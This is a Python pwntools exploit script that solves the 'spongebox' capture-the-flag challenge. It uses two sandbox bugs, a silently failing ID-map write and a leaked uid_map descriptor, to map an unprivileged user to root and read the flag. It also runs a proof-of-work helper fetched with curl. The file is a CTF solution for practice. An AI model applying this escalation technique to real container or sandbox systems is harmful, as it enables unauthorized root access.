#!/usr/bin/env python3
import re

from pwn import *


def connect():
    if args.DOCKER:
        subprocess.call(["docker", "rm", "-f", "spongebox"])
        return process(
            [
                "docker",
                "run",
                "-i",
                "--rm",
                "--name=spongebox",
                "--security-opt=seccomp=unconfined",
                "--cap-add=SYS_ADMIN",
                "spongebox",
                "strace",
                "-f",
                "-o",
                "/strace.log",
                "./sandbox",
            ]
        )
    elif args.LOCAL:
        return process(["strace", "-f", "-o", "/strace.log", "./sandbox"])
    else:
        tube = remote("spongebox.chal.perfect.blue", 1337)
        pow = b"python3 <(curl -sSL https://goo.gle/kctf-pow) solve "
        tube.recvuntil(pow)
        challenge = tube.recvline()
        assert re.match(b"^[a-zA-Z0-9./+]+$", challenge), challenge
        tube.sendline(
            subprocess.check_output(["bash", "-c", (pow + challenge).decode()])
        )
        tube.recvuntil(b"Welcome to the spongebox!\n")
        return tube


CMD_CREATE = b"\x01"
CMD_CONNECT = b"\x02"
CMD_COMMUNICATE = b"\x03"
MAX_STRING_SIZE = 4096
DEFAULT_UID = 1000
ROOT_UID = 0


def main():
    long_id = "1000".rjust(MAX_STRING_SIZE - 1, "0")
    boring_id = "1000"
    subprocess.check_call(["clang-format", "-i", "sandbox0.c", "sandbox1.c"])
    subprocess.check_call(
        [
            "musl-gcc",
            "-static",
            "-Wall",
            "-Wextra",
            "-Werror",
            "sandbox0.c",
            "-o",
            "sandbox0",
        ]
    )
    with open("sandbox0", "rb") as fp:
        sandbox0 = fp.read()
    subprocess.check_call(
        [
            "musl-gcc",
            "-static",
            "-Wall",
            "-Wextra",
            "-Werror",
            "sandbox1.c",
            "-o",
            "sandbox1",
        ]
    )
    with open("sandbox1", "rb") as fp:
        sandbox1 = fp.read()
    with connect() as tube:
        # Start the first sandbox.
        # BUG: setup_idmaps() will silently fail when given more than PAGE_SIZE
        # bytes. See the "count >= PAGE_SIZE" check in map_write().
        tube.send(
            b"".join(
                (
                    # type
                    CMD_CREATE,
                    # uid_size
                    struct.pack("<Q", len(long_id)),
                    # uid
                    long_id.encode(),
                    # gid_size
                    struct.pack("<Q", len(boring_id)),
                    # gid
                    boring_id.encode(),
                    # elf_size
                    struct.pack("<Q", len(sandbox0)),
                    # elf
                    sandbox0,
                )
            )
        )
        tube.recvuntil(b"Sucessfully created sandbox")
        # Start the second sandbox.
        # BUG: the first sandbox's uid_map_fd leaks into the second sandbox.
        tube.send(
            b"".join(
                (
                    # type
                    CMD_CREATE,
                    # uid_size
                    struct.pack("<Q", len(boring_id)),
                    # uid
                    boring_id.encode(),
                    # gid_size
                    struct.pack("<Q", len(boring_id)),
                    # gid
                    boring_id.encode(),
                    # elf_size
                    struct.pack("<Q", len(sandbox1)),
                    # elf
                    sandbox1,
                )
            )
        )
        # Give the second sandbox some time to start.
        tube.recvuntil(b"Sucessfully created sandbox")
        if args.LOCAL:
            time.sleep(1)
        else:
            time.sleep(5)
        # Write uid_map.
        tube.send(
            b"".join(
                (
                    # type
                    CMD_CONNECT,
                    # sandbox_id
                    struct.pack("<I", 1),
                    # type
                    CMD_COMMUNICATE,
                    # sandbox_id
                    struct.pack("<I", 1),
                    # message (uid_map)
                    f"{DEFAULT_UID} {ROOT_UID} 1".encode(),
                ),
            ),
        )
        tube.recvuntil(b"message: sandbox1")
        # Get the flag.
        tube.send(
            b"".join(
                (
                    # type
                    CMD_CONNECT,
                    # sandbox_id
                    struct.pack("<I", 0),
                    # type
                    CMD_COMMUNICATE,
                    # sandbox_id
                    struct.pack("<I", 0),
                    # message (ping)
                    b"x",
                )
            )
        )
        # bwctf{you_must_love_the_linux_kernel}
        tube.interactive()


if __name__ == "__main__":
    main()
